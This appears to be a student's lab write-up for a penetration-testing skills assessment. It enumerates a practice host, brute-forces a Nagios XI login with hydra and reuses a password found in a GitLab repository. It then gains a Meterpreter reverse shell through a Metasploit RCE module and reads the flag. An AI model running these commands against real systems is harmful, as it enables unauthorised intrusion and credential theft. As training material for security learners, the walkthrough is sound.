# Attacking Common Applications - Skills Assessment II

sudo nmap --open -sV 10.129.201.90

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
389/tcp  open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
8180/tcp open  http     nginx
Service Info: Host:  skills2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

http://10.129.201.90/

<li><a href="http://blog.inlanefreight.local/">Employee Blog</a></li>

IP=10.129.201.90
printf "%s\t%s\n\n" "$IP" "gitlab.inlanefreight.local" | sudo tee -a /etc/hosts

http://gitlab.inlanefreight.local:8180/

http://gitlab.inlanefreight.local:8180/users/sign_in

http://gitlab.inlanefreight.local:8180/users/sign_up

root
Username is already taken.

admin
Username is available.

test@test.com
testtest

http://gitlab.inlanefreight.local:8180/explore

http://gitlab.inlanefreight.local:8180/root/virtualhost

http://gitlab.inlanefreight.local:8180/root/virtualhost/-/blob/master/README.md
monitoring.inlanefreight.local

IP=10.129.201.90
printf "%s\t%s\n\n" "$IP" "monitoring.inlanefreight.local" | sudo tee -a /etc/hosts

http://monitoring.inlanefreight.local/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
http://monitoring.inlanefreight.local/nagiosxi/about/

GET /nagiosxi/login.php?redirect=/index.php%3f&noauth=1 HTTP/1.1
Cookie: nagiosxi=vqnt45h0s9j2ulua41aboagcj4

POST /nagiosxi/login.php HTTP/1.1
nsp=ea786a677beaeb2e60d6f5730d4c848ad66ad746365de3ceffd1abac7d290db9&page=auth&debug=&pageopt=login&redirect=%2Findex.php%3F&username=admin&password=nagiosadmin&loginButton=

sudo msfconsole -q
use auxiliary/scanner/http/nagios_xi_scanner
set RHOSTS 10.129.201.90
set VHOST monitoring.inlanefreight.local

[!] No credentials provided. Attempting to obtain the Nagios XI version from the login page. This will not work for newer versions.
[-] 10.129.201.90:80 - Unable to obtain Nagios XI version from the login page.
[!] Please provide a valid Nagios XI USERNAME and PASSWORD, or a specific VERSION to check

set RPORT 8180
run

[!] No credentials provided. Attempting to obtain the Nagios XI version from the login page. This will not work for newer versions.
[-] 10.129.201.90:8180 - Target is not a Nagios XI application
[!] Please provide a valid Nagios XI USERNAME and PASSWORD, or a specific VERSION to check


hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f monitoring.inlanefreight.local http-get /nagiosxi/login.php

--> Failed (bad parameters for hydra)

sudo hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt monitoring.inlanefreight.local http-post-form "/nagiosxi/login.php:nsp=ea786a677beaeb2e60d6f5730d4c848ad66ad746365de3ceffd1abac7d290db9&page=auth&debug=&pageopt=login&redirect=%2Findex.php%3F&username=admin&password=^PASS^&loginButton=:Invalid username or password"

--> Too long

sudo hydra -l admin -P /opt/useful/SecLists/Passwords/xato-net-10-million-passwords-100.txt monitoring.inlanefreight.local http-post-form "/nagiosxi/login.php:nsp=ea786a677beaeb2e60d6f5730d4c848ad66ad746365de3ceffd1abac7d290db9&page=auth&debug=&pageopt=login&redirect=%2Findex.php%3F&username=admin&password=^PASS^&loginButton=:Invalid username or password"

1 of 1 target completed, 0 valid password found

sudo hydra -l admin -P /opt/useful/SecLists/Passwords/xato-net-10-million-passwords-1000.txt monitoring.inlanefreight.local http-post-form "/nagiosxi/login.php:nsp=ea786a677beaeb2e60d6f5730d4c848ad66ad746365de3ceffd1abac7d290db9&page=auth&debug=&pageopt=login&redirect=%2Findex.php%3F&username=admin&password=^PASS^&loginButton=:Invalid username or password"

1 of 1 target completed, 0 valid password found


http://gitlab.inlanefreight.local:8180/root/nagios-postgresql/-/blob/master/INSTALL

postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';

--> OK

Update Check Problem: Last update check failed.
Latest Available Version:	5.8.6
Installed Version:	5.7.5
Last Update Check:	2024-01-20 10:39:26


sudo msfconsole -q
search 49422
use exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce
set LHOST 10.10.15.174
set RHOSTS 10.129.201.90
set VHOST monitoring.inlanefreight.local
set PASSWORD oilaKglm7M09@CPL&^lC

check

[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.7.5
[*] 10.129.201.90:80 - The target appears to be vulnerable.
[msf](Jobs:0 Agents:0) exploit(

run

[+] The target appears to be vulnerable.
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).

--> Close burp which uses 8080 port

run

(Meterpreter 1)(/usr/local/nagiosxi/html/admin) > shell
cat f5088a862528cbb16b4e253f1809882c_flag.txt
afe377683dce373ec2bf7eaf1e0107eb
